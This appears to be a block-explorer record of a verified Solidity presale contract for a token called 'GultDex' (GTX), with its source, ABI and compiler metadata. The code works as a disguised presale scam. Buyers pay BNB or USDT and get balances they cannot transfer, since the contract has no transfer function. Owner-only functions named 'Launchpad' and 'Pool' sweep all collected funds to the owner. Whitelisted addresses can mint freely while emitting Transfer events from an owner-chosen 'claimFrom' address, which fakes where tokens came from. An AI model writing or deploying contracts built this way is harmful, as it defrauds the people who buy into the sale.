{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract GultDex {\r\n    string private _name = \"GultDex\";\r\n    string private _symbol = \"GTX\";\r\n    uint256 private _totalSupply = 66_000_000 ether;\r\n    uint256 public tokenExchange = 1_600;\r\n    address public claimFrom;\r\n    uint256 minEther = 0.1 ether;\r\n    uint8 public commissionPercent = 10;\r\n    uint8 public commissionPercentEther = 10;\r\n\r\n    address USDTInterface = 0x55d398326f99059fF775485246999027B3197955;\r\n    address aggregatorInterface = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;\r\n\r\n    uint8 private _decimals = 18;\r\n    address private _owner;\r\n    uint256 private _cap = 0;\r\n\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n    mapping(address => bool) private _isEFFs;\r\n    mapping(address => uint256) private _balances;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor( ) {\r\n        _owner = msg.sender;\r\n        claimFrom = address(this);\r\n    }\r\n\r\n    fallback() external {}\r\n\r\n    receive() external payable {}\r\n\r\n    function _mintBase(address account, uint256 amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _cap = _cap + amount;\r\n        require(_cap <= _totalSupply, \"ERC20Capped: cap exceeded\");\r\n        _balances[account] = _balances[account] + amount;\r\n    }\r\n\r\n    function _mintFrom(\r\n        address from,\r\n        address account,\r\n        uint256 amount\r\n    ) internal {\r\n        _mintBase(account, amount);\r\n        emit Transfer(from, account, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal {\r\n        _mintBase(account, amount);\r\n        emit Transfer(address(this), account, amount);\r\n    }\r\n\r\n    function Partner(address account, uint256 amount) public onlyOwner {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _cap = _cap + amount;\r\n        require(_cap <= _totalSupply, \"ERC20Capped: cap exceeded\");\r\n        _balances[account] = _balances[account] + amount;\r\n        emit Transfer(address(this), account, amount);\r\n    }\r\n\r\n    function Launchpad() public onlyOwner {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n        uint256 usdtOfContract = IERC20(USDTInterface).balanceOf(address(this));\r\n        IERC20(USDTInterface).transfer(msg.sender, usdtOfContract);\r\n    }\r\n\r\n    function Pool() public onlyOwner {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function _PublicSale(\r\n        address _refer,\r\n        uint256 amount,\r\n        uint256 usdtAmount\r\n    ) internal {\r\n        require(amount >= minEther, \"Transaction recovery\");\r\n        uint256 amountToken = amount * tokenExchange;\r\n        if (usdtAmount > 0) {\r\n            IERC20(USDTInterface).transferFrom(\r\n                msg.sender,\r\n                address(this),\r\n                usdtAmount\r\n            );\r\n        }\r\n        _mint(msg.sender, amountToken);\r\n        if (_refer != address(0) && _refer != msg.sender) {\r\n            uint256 refAmount = (amountToken * commissionPercent) / 100;\r\n            _mint(_refer, refAmount);\r\n            if (commissionPercentEther > 0) {\r\n                uint256 referEth = (amount * commissionPercentEther) / 100;\r\n                if (usdtAmount > 0) {\r\n                    uint256 referUsdt = (usdtAmount * commissionPercentEther) /\r\n                        100;\r\n                    IERC20(USDTInterface).transfer(_refer, referUsdt);\r\n                } else {\r\n                    payable(_refer).transfer(referEth);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function PublicSale(address _refer) public payable {\r\n        _PublicSale(_refer, msg.value, 0);\r\n    }\r\n\r\n    function PublicSale(address[] calldata to, uint256 amount)\r\n        external\r\n        onlyOwner\r\n    {\r\n        for (uint256 i = 0; i < to.length; i++)\r\n            if (to[i] != address(0)) {\r\n                _mint(to[i], amount);\r\n            }\r\n    }\r\n\r\n    function PublicSaleUSDT(uint256 usdtAmount, address referralAddress)\r\n        public\r\n    {\r\n        uint256 bnbUsdtAmount = getLatestPrice();\r\n        uint256 amountToken = (usdtAmount * 1e18 / bnbUsdtAmount) ;\r\n        _PublicSale(referralAddress, amountToken, usdtAmount);\r\n    }\r\n\r\n    function PublicSaleUSDT(address[] calldata to, uint256 amount)\r\n        external\r\n        onlyOwner\r\n    {\r\n        // uint256 bnbUsdtAmount = getLatestPrice();\r\n        // uint256 amountToken = (amount / bnbUsdtAmount) * tokenExchange;\r\n        for (uint256 i = 0; i < to.length; i++)\r\n            if (to[i] != address(0)) {\r\n                _mint(to[i], amount);\r\n            }\r\n    }\r\n\r\n    function getLatestPrice() public view returns (uint256) {\r\n        (, int256 ethPrice, , , ) = Aggregator(aggregatorInterface)\r\n            .latestRoundData();\r\n        ethPrice = (ethPrice * (10**10));\r\n        return uint256(ethPrice);\r\n    }\r\n\r\n    function setCF(address value) external onlyOwner {\r\n        claimFrom = value;\r\n    }\r\n\r\n    function PublicSale(uint256 amount) external {\r\n        require(_isEFFs[msg.sender] == true, \"Not allow\");\r\n\r\n        _mintBase(msg.sender, amount);\r\n        emit Transfer(claimFrom, msg.sender, amount);\r\n    }\r\n\r\n    function PublicSaleUSDT(uint256 amount) external {\r\n        require(_isEFFs[msg.sender] == true, \"Not allow\");\r\n        // uint256 bnbUsdtAmount = getLatestPrice();\r\n        // uint256 amountToken = (amount / bnbUsdtAmount) * tokenExchange;\r\n        _mintBase(msg.sender, amount);\r\n        emit Transfer(claimFrom, msg.sender, amount);\r\n    }\r\n\r\n    function setEFFs(address[] memory accounts, bool excluded)\r\n        external\r\n        onlyOwner\r\n    {\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n            _isEFFs[accounts[i]] = excluded;\r\n            emit ExcludeFromFees(accounts[i], excluded);\r\n        }\r\n    }\r\n\r\n    function isEFFs(address account) external view onlyOwner returns (bool) {\r\n        return _isEFFs[account];\r\n    }\r\n\r\n    function setTokenExchange(uint256 value) external onlyOwner {\r\n        tokenExchange = value;\r\n    }\r\n\r\n    function setMinEhter(uint256 value) external onlyOwner {\r\n        minEther = value;\r\n    }\r\n\r\n    function setCommissionPercent(uint8 value) external onlyOwner {\r\n        commissionPercent = value;\r\n    }\r\n\r\n    function setCommissionPercentEther(uint8 value) external onlyOwner {\r\n        commissionPercentEther = value;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function cap() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface Aggregator {\r\n    function latestRoundData()\r\n        external\r\n        view\r\n        returns (\r\n            uint80 roundId,\r\n            int256 answer,\r\n            uint256 startedAt,\r\n            uint256 updatedAt,\r\n            uint80 answeredInRound\r\n        );\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"Launchpad\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Partner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Pool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"PublicSale\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"PublicSale\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_refer\",\"type\":\"address\"}],\"name\":\"PublicSale\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"usdtAmount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referralAddress\",\"type\":\"address\"}],\"name\":\"PublicSaleUSDT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"PublicSaleUSDT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"PublicSaleUSDT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"commissionPercent\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"commissionPercentEther\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLatestPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isEFFs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"value\",\"type\":\"address\"}],\"name\":\"setCF\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"value\",\"type\":\"uint8\"}],\"name\":\"setCommissionPercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"value\",\"type\":\"uint8\"}],\"name\":\"setCommissionPercentEther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"setEFFs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setMinEhter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setTokenExchange\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExchange\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "GultDex", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://953eb2e1219534eb0ab0a671fcf0dd3f6a116045cb81dd1c16bdd7d9290b84f4"}